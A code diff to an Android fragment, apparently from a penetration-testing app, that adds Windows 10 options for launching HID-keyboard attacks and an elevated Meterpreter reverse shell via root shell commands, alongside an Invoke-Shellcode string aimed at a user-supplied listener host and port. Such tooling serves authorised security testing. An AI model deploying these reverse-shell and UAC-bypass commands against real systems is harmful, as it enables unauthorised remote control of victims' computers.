@@ -48,7 +48,7 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
     ViewPager mViewPager;
     SharedPreferences sharedpreferences;
     static NhUtil nh;
-    final CharSequence[] platforms = {"No UAC Bypass", "Windows 7", "Windows 8"};
+    final CharSequence[] platforms = {"No UAC Bypass", "Windows 7", "Windows 8", "Windows 10"};
     final CharSequence[] languages = {"American English", "Belgian", "British English", "Danish", "French", "German", "Italian", "Norwegian", "Portugese", "Russian", "Spanish", "Swedish"};
     private String configFilePath;
 
@@ -195,8 +195,14 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
                 case 1:
                     command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali start-rev-met-elevated-win7 --" + lang + "'";
                     break;
-                default:
+                case 2:
                     command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali start-rev-met-elevated-win8 --" + lang + "'";
+                    break;
+                case 3:
+                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali start-rev-met-elevated-win10 --" + lang + "'";
+                    break;
+                default:
+                    nh.showMessage("No option selected 1");
                     break;
             }
         } else if (pageNum == 1) {
@@ -207,8 +213,14 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
                 case 1:
                     command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali hid-cmd-elevated-win7 --" + lang + "'";
                     break;
-                default:
+                case 2:
                     command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali hid-cmd-elevated-win8 --" + lang + "'";
+                    break;
+                case 3:
+                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali hid-cmd-elevated-win10 --" + lang + "'";
+                    break;
+                default:
+                    nh.showMessage("No option selected 2");
                     break;
             }
         }
@@ -393,7 +405,6 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
 
                     String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";
 
-
                     ShellExecuter exe = new ShellExecuter();
                     String source = exe.ReadFile_SYNC(nh.APP_SD_FILES_PATH + configFilePath);
 
@@ -539,7 +550,6 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
                     break;
                 case R.id.windowsCmdLoad:
                     try {
-
                         File scriptsDir = new File(nh.APP_SD_FILES_PATH,loadFilePath);
                         if(!scriptsDir.exists()) scriptsDir.mkdirs();
                     } catch (Exception e) {
@@ -552,7 +562,6 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
                     break;
                 case R.id.windowsCmdSave:
 					 try {
-
                         File scriptsDir = new File(nh.APP_SD_FILES_PATH,loadFilePath);
                         if(!scriptsDir.exists()) scriptsDir.mkdirs();
                     } catch (Exception e) {
@@ -573,7 +582,6 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
                             if(!value.equals("") && value.length() >0){
                             //FIXME Save file (ask name)
                                 File scriptFile = new File(nh.APP_SD_FILES_PATH + loadFilePath + File.separator +  value +".conf");
-                                System.out.println(scriptFile.getAbsolutePath());
                                 if(!scriptFile.exists()){
                                     try {
                                         EditText source = (EditText) getView().findViewById(R.id.windowsCmdSource);
@@ -596,7 +604,6 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
                             }
                         }
                     });
-
                     alert.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                         public void onClick(DialogInterface dialog, int whichButton) {
                            ///Do nothing
@@ -617,23 +624,11 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
                     if (resultCode == Activity.RESULT_OK) {
                         String FilePath = data.getData().getPath();
                         EditText source = (EditText) getView().findViewById(R.id.windowsCmdSource);
-                        try {
-                            String text = "";
-                            BufferedReader br = new BufferedReader(new FileReader(FilePath));
-                            String line;
-                            while ((line = br.readLine()) != null) {
-                                text += line + '\n';
-                            }
-                            br.close();
-                            source.setText(text);
-                            nh.showMessage("Script loaded");
-                        } catch (Exception e) {
-                            nh.showMessage(e.getMessage());
-                        }
-                        break;
+                        ShellExecuter exe = new ShellExecuter();
+                        exe.ReadFile_ASYNC(FilePath, source);
+                        nh.showMessage("Script loaded");
                     }
                     break;
-
             }
         }
     }
